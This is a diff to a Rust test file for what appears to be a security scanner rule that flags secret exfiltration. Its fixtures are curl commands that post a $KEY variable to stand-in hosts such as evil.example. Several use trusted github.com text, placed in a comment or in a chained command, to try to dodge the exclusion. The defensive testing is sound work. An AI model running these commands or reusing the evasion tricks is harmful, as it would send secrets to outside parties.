@@ -343,6 +343,10 @@ fn test_ex001_trusted_host_exclusions_are_scoped_in_cli_scan() {
             "curl -d \"$KEY\" https://registry.evil.example/\n",
             "curl -d \"$KEY\" https://get.docker.com/install.sh; ",
             "curl -d \"$OTHER\" https://evil.example/upload\n",
+            "curl -d \"$KEY\" \"$URL\"; curl https://github.com/\n",
+            "echo https://github.com/; curl -d \"$KEY\" \"$URL\"\n",
+            "curl -d \"$KEY\" \"$URL\" https://github.com/upload\n",
+            "curl -d \"$KEY\" https://evil.example/upload '# https://github.com/'\n",
         ),
     )
     .unwrap();
@@ -402,6 +406,26 @@ fn test_ex001_trusted_host_exclusions_are_scoped_in_cli_scan() {
         ex001_codes
             .iter()
             .any(|code| code.contains("get.docker.com") && code.contains("evil.example/upload"))
+    );
+    assert!(
+        ex001_codes
+            .iter()
+            .any(|code| { code.contains("\"$URL\"; curl https://github.com/") })
+    );
+    assert!(
+        ex001_codes
+            .iter()
+            .any(|code| { code.contains("echo https://github.com/; curl") })
+    );
+    assert!(
+        ex001_codes
+            .iter()
+            .any(|code| { code.contains("\"$URL\" https://github.com/upload") })
+    );
+    assert!(
+        ex001_codes
+            .iter()
+            .any(|code| { code.contains("evil.example/upload '# https://github.com/'") })
     );
     assert!(
         !ex001_codes
